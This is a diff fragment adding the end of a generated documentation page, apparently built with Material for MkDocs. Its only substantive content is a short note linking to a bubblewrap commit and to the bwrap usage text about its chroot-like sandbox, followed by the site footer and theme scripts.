+<li><a href="https://github.com/containers/bubblewrap/commit/efc89e3b939b4bde42c10f065f6b7b02958ed50e">https://github.com/containers/bubblewrap/commit/efc89e3b939b4bde42c10f065f6b7b02958ed50e</a></li>
+</ul>
+<p>The first paragraph in the usage for <code>bwrap</code> also explains this chroot-like environment is completely invisible to the normal host:</p>
+<ul>
+<li><a href="https://github.com/containers/bubblewrap#usage">https://github.com/containers/bubblewrap#usage</a></li>
+</ul>
+<hr />
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2023-2024 straysheep-dev
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/straysheep-dev" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../..", "features": ["navigation.instant", "navigation.tracking", "navigation.path", "navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.path", "navigation.top", "toc.integrate", "search.suggest", "search.highlight", "search.share", "content.tooltips"], "search": "../../../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
+      
+    
+  </body>
+</html>
